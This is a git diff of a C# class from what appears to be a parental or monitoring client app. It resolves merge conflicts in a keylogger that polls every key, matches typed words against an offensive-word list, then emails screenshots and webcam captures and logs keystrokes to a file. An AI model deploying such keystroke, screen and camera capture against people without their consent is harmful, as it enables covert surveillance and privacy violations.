@@ -5,14 +5,14 @@ using System.Linq;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using System.Text;
-using System.Text.RegularExpressions;  
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace ClientSide
-{  
-    class MonitorTyping:Monitor
+{
+    class MonitorTyping : Monitor
     {
 
         string input = "";
@@ -38,7 +38,7 @@ namespace ClientSide
         [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public  void playThread()
+        public void playThread()
         {
             Thread keyLogger = new Thread(playKeyLogger);
             keyLogger.Start();
@@ -48,7 +48,7 @@ namespace ClientSide
         {
             List<string> offensiveWords = base.SettingInstance.getWord();
             input = "";
-             
+
             while (base.monitorAlive)
             {
                 Thread.Sleep(5);
@@ -57,56 +57,39 @@ namespace ClientSide
                     int keyState = GetAsyncKeyState(i);
                     if (keyState == 32769)
                     {
-                        input += (char)i; 
+                        input += (char)i;
 
                         if (i == 32) // if type space 
-<<<<<<< HEAD
                         {
-=======
-                        { 
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
                             //ShowErrorDialog(input+", "+ifLive);
-                            if(ifLive)
+                            if (ifLive)
                             {
                                 wordFromKeylogger handler = Program.updateCurrentKeylogger;
                                 handler(input);
                             }
-                            
+
 
                             //ShowErrorDialog(input);
                             string replacement = input.Replace(" ", "");
                             //ShowErrorDialog(replacement);
-                             foreach (string badWord in offensiveWords)
-                             {
+                            foreach (string badWord in offensiveWords)
+                            {
 
-                                 string xb = badWord.Replace(" ", "");
-<<<<<<< HEAD
-                                 if (replacement.ToLower().Equals(badWord))
-                                 {
-                                     reportOrSendAlert(badWord);                                  
-                                 }
-=======
-                                if (replacement.ToLower().Equals(badWord) && xb.Length>0)
-                                 {
-                                     reportOrSendAlert(badWord);                                  
-                                 }   // atara 
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
+                                string xb = badWord.Replace(" ", "");
+                                if (replacement.ToLower().Equals(badWord) && xb.Length > 0)
+                                {
+                                    reportOrSendAlert(badWord);
+                                }   // atara 
                             }
                             input = "";
                         }
 
-                       
+
                     }
                 }
-<<<<<<< HEAD
-            }  
-
+            }
         }
-=======
-            }
-            }
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
-     
+
         private void reportOrSendAlert(string badWord)
         {
             if (base.SettingInstance.triggersForAlert.Contains("badWord") == true)
@@ -114,11 +97,7 @@ namespace ClientSide
                 string FilePic = Picters.ScreenCapture();
                 Picters.CaptureCamera(FilePic);
                 Report.sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
-<<<<<<< HEAD
-                ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: " + badWord );
-=======
                 ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: |" + badWord + "|");
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
 
             }
 
@@ -126,25 +105,21 @@ namespace ClientSide
             {
                 base.DBInstance.connectToDatabase();
                 base.DBInstance.fillTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
-<<<<<<< HEAD
-                ShowErrorDialog("update DB\nTypedin trigger occur\nword: " + badWord);
-=======
-                ShowErrorDialog("update DB\nTypedin trigger occur\nword: |" + badWord+"|");
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
+                ShowErrorDialog("update DB\nTypedin trigger occur\nword: |" + badWord + "|");
             }
         }
 
-        public  void inputEqualsSARA()
+        public void inputEqualsSARA()
         {
-           
-            
+
+
             // sava keylogger in file
             String filepath = Environment.CurrentDirectory;
             if (!Directory.Exists(filepath))
             {
                 Directory.CreateDirectory(filepath);
             }
-           
+
             string path = (filepath + @"\AllAPP.txt");
 
             if (!File.Exists(path))
@@ -169,10 +144,6 @@ namespace ClientSide
         {
             MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
         }
-<<<<<<< HEAD
     }
-=======
-    } 
->>>>>>> 0374d47b78fa1e09394efa66121e89e6e3b6e12c
 }
-//abbabb
+ 
